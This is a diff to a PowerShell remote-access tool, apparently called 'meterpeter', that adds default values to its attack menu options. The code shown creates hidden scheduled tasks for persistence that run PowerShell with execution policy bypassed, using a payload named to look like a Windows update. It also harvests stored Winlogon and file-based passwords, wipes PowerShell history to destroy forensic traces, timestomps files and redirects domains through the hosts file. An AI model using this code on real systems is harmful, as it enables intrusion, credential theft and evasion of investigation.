@@ -490,6 +490,7 @@ While($Client.Connected)
           write-host " List Remote-Host Folder Permissions (icacls)." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;
           write-host " - Input Remote Folder Path (`$env:tmp): " -NoNewline;
           $RfPath = Read-Host;write-host "`n`n";
+          If(-not($RfPath)){$RfPath = "$env:tmp"}
           $Command = "icacls `"$RfPath`" `> dellog.txt;Get-Content dellog.txt;remove-item dellog.txt -Force";
         }
         If($my_choise -eq "WeakDir" -or $my_choise -eq "Dir")
@@ -573,6 +574,7 @@ While($Client.Connected)
         {
           write-Host " - Input TaskName: " -NoNewline;
           $TaskName = Read-Host;
+          If(-not($TaskName)){$TaskName = "BgTaskRegistrationMaintenanceTask"}
           write-host " Retriving '$TaskName' Task Verbose Information ." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
           $Command = "cmd /R schtasks /Query /tn `"$TaskName`" /v /fo list `> schedule.txt;`$check_tasks = Get-content schedule.txt;If(-not (`$check_tasks)){echo `"   [i] None schedule Task found in: $Remote_Host`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{Get-content schedule.txt;Remove-Item schedule.txt -Force}";
         }
@@ -588,6 +590,10 @@ While($Client.Connected)
           write-host " Examples: 'cmd /c start calc.exe' [OR] '`$env:tmp\dropper.bat'" -ForegroundColor Blue -BackGroundColor White;
           write-Host " - Input Command|Binary Path: " -NoNewline;
           $execapi = Read-Host;
+          If(-not($Interval)){$Interval = "10"}
+          If(-not($userinput)){$userinput = "1"}
+          If(-not($TaskName)){$TaskName = "METERPETER"}
+          If(-not($execapi)){$execapi = "cmd /c start calc.exe"}
           write-host "[*] This task wil have the max duration of $Display_dur" -ForegroundColor green;Start-Sleep -Seconds 1;write-host "`n`n";
           $Command = "cmd /R schtasks /Create /sc minute /mo $Interval /tn `"$TaskName`" /tr `"$execapi`" /du $Task_duration;schtasks /Query /tn `"$TaskName`" `> schedule.txt;`$check_tasks = Get-content schedule.txt;If(-not (`$check_tasks)){echo `"   [i] meterpeter Failed to create Task in: $Remote_Host`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{Get-content schedule.txt;Remove-Item schedule.txt -Force}";
         }
@@ -595,6 +601,7 @@ While($Client.Connected)
         {
           write-Host " - Input TaskName: " -NoNewline -ForeGroundColor Red;
           $TaskName = Read-Host;
+          If(-not($TaskName)){$TaskName = "METERPETER"}
           write-host " Deleting Remote '$TaskName' Task." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
           $Command = "cmd /R schtasks /Delete /tn `"$TaskName`" /f `> schedule.txt;`$check_tasks = Get-content schedule.txt;If(-not (`$check_tasks)){echo `"   [i] None Task Name: $TaskName found ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{Get-content schedule.txt;Remove-Item schedule.txt -Force}";  
         }
@@ -960,6 +967,8 @@ While($Client.Connected)
           Write-Host "   --------   ------------------";
           Write-Host "   $onjuyhg   $execapi";
           write-host "`n";
+          If(-not($Interval)){$Interval = "10"}
+          If(-not($execapi)){$execapi = "$env:tmp\Update-KB4524147.ps1"}
           ## Settings: ($stime == time-interval) | (/st 00:00 /du 0003:00 == 3 hours duration)
           $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 `> test.log;If(Get-Content test.log|Select-String `"Enabled`"){cmd /R schtasks /Create /sc minute /mo $Interval /tn `"$onjuyhg`" /tr `"powershell -version 2 -Execution Bypass -windowstyle hidden -NoProfile -File `"$execapi`"`";schtasks /Query /tn `"$onjuyhg`" `> schedule.txt;Get-content schedule.txt;Remove-Item schedule.txt -Force}else{cmd /R schtasks /Create /sc minute /mo $Interval /tn `"$onjuyhg`" /tr `"powershell -Execution Bypass -windowstyle hidden -NoProfile -File `"$execapi`"`";schtasks /Query /tn `"$onjuyhg`" `> schedule.txt;Get-content schedule.txt;Remove-Item schedule.txt -Force}}else{cmd /R schtasks /Create /sc minute /mo $Interval /tn `"$onjuyhg`" /tr `"powershell -Execution Bypass -windowstyle hidden -NoProfile -File `"$execapi`"`";schtasks /Query /tn `"$onjuyhg`" `> schedule.txt;Get-content schedule.txt;Remove-Item schedule.txt -Force}";
         }    
@@ -1138,9 +1147,9 @@ While($Client.Connected)
           write-host "`n";
           $Command = "`$My_Line = `"$MYSpeak`";Add-Type -AssemblyName System.speech;`$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer;`$speak.Volume = 85;`$speak.Rate = -3;`$speak.Speak(`$My_Line);echo `"   [OK] Speak Frase: '$MYSpeak' Remotely ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
         }else{
-          write-host "`n`n";
-          write-host " [ERROR] Abort, None Frase Inputed by User .." -ForegroundColor Red -BackgroundColor White;write-host "`n";Start-Sleep -Seconds 3;
-          $Command = $Null;
+          write-host "`n";
+          $MYSpeak = "Next time dont forget to input the text   ok";
+          $Command = "`$My_Line = `"$MYSpeak`";Add-Type -AssemblyName System.speech;`$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer;`$speak.Volume = 85;`$speak.Rate = -3;`$speak.Speak(`$My_Line);echo `"   [OK] Speak Frase: '$MYSpeak' Remotely ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
         }
       }      
       If($choise -eq "ListPas" -or $choise -eq "pas")
@@ -1148,6 +1157,7 @@ While($Client.Connected)
         write-host " List Stored Passwords (in Text|Log Files)." -ForegroundColor Blue -BackgroundColor White;
         write-host " - Directory to search recursive (`$env:userprofile): " -NoNewLine;
         $Recursive_search = Read-Host;
+        If(-not($Recursive_search)){$Recursive_search = "$env:userprofile"}
         write-host " [warning] This Function Might Take aWhile To Complete .." -ForegroundColor red -BackGroundColor white;write-host "`n`n";
         $Command = "echo `"[i] [WinLogon Creds]`" `> `$env:tmp\passwd.txt;cmd /R reg query `"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`" /v DefaultUserName `>`> `$env:tmp\passwd.txt;cmd /R reg query `"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`" /v DefaultPassword `>`> `$env:tmp\passwd.txt;echo `"[i] [List of Passwords in Text|Log Files]`" `>`> `$env:tmp\passwd.txt;cd $Recursive_search|findstr /s /C:`"passwd`" *.txt *.log `>`> `$env:tmp\passwd.txt;cd $Recursive_search|findstr /s /C:`"password`" *.txt *.log `>`> `$env:tmp\passwd.txt;cd $Recursive_search|findstr /s /C:`"pass`" *.txt *.log `>`> `$env:tmp\passwd.txt;Get-Content `$env:tmp\passwd.txt;Remove-Item `$env:tmp\passwd.txt -Force;echo `"Forensic null factor`" `> `$env:appdata\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt;cd `$env:tmp";
       }
@@ -1156,6 +1166,7 @@ While($Client.Connected)
         write-host " List Hidden directorys recursive." -ForegroundColor Blue -BackgroundColor White;
         write-host " - Directory to start search recursive (`$env:userprofile): " -NoNewLine;
         $Recursive_search = Read-Host;
+        If(-not($Recursive_search)){$Recursive_search = "$env:userprofile"}
         write-host " [warning] This Function Might Take aWhile To Complete .." -ForegroundColor red -BackGroundColor white;write-host "`n`n";
         $Command = "Get-ChildItem -Hidden -Path $Recursive_search -Recurse -Force -ErrorAction SilentlyContinue  >` `$env:tmp\hidden.txt;Get-Content `$env:tmp\hidden.txt|Where-Object {`$_ -notmatch '.ini'}|Set-Content `$env:tmp\out.txt;Get-Content `$env:tmp\out.txt|Where-Object {`$_ -notmatch '.dat'}|Set-Content `$env:tmp\out2.txt;Get-Content `$env:tmp\out2.txt|Where-Object {`$_ -notmatch '.tmp'}|Set-Content `$env:tmp\out3.txt;Get-Content `$env:tmp\out3.txt;Remove-Item *.txt -Force";
       }
@@ -1166,6 +1177,7 @@ While($Client.Connected)
         $mace_path = Read-Host;
         write-host " - Input 'day/month/year hh:mm:ss': " -NoNewline;
         $set_time = Read-Host;write-host "`n`n";
+        If(-not($set_time)){$set_time = "19/12/1999 19:19:19"}
         $Command = "`$1=`"$mace_path`";If(([System.IO.File]::Exists(`"`$1`"))){Get-ChildItem $mace_path|% {`$_.creationtime = '$set_time'};Get-ChildItem $mace_path|% {`$_.lastaccesstime = '$set_time'};Get-ChildItem $mace_path|% {`$_.LastWriteTime = '$set_time'};Get-ChildItem $mace_path|Select-Object Name,LastWriteTime `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   File: $mace_path Not Found in Remote System`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
       }
       If($choise -eq "AMSIset" -or $choise -eq "amsi")
@@ -1298,6 +1310,11 @@ While($Client.Connected)
       }
       If($choise -eq "Dnspoof" -or $choise -eq "dns")
       {
+        write-host "`n   Warnning" -ForegroundColor Yellow;
+        write-host "   --------";
+        write-host "   The First time 'Spoof' module its used, it will backup";
+        write-host "   the real hosts file (hosts-backup) there for its importante";
+        write-host "   to allways 'Default' the hosts file before using 'Spoof' again.";
         write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
         write-host "   -------   -----------                     ------";
         write-host "   Check     Review hosts File               Client:User  - Privileges Required";
@@ -1317,6 +1334,8 @@ While($Client.Connected)
           $Ip_spoof = Read-Host;
           write-host " - Domain to be Redirected: " -NoNewline;
           $Domain_spoof = Read-Host;
+          If(-not($Ip_spoof)){$Ip_spoof = "$localIpAddress"}
+          If(-not($Domain_spoof)){$Domain_spoof = "www.google.com"}
           ## Copy-Item -Path '$env:windir\system32\Drivers\etc\hosts' -Destination '%SYSTEMROOT%\system32\Drivers\etc\hosts-backup' -Force
           write-host " Redirecting Domains Using hosts File (Dns Spoofing)." -ForegroundColor Blue -BackgroundColor White;
           write-host " Redirect Domain: $Domain_spoof TO IPADDR: $Ip_spoof" -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
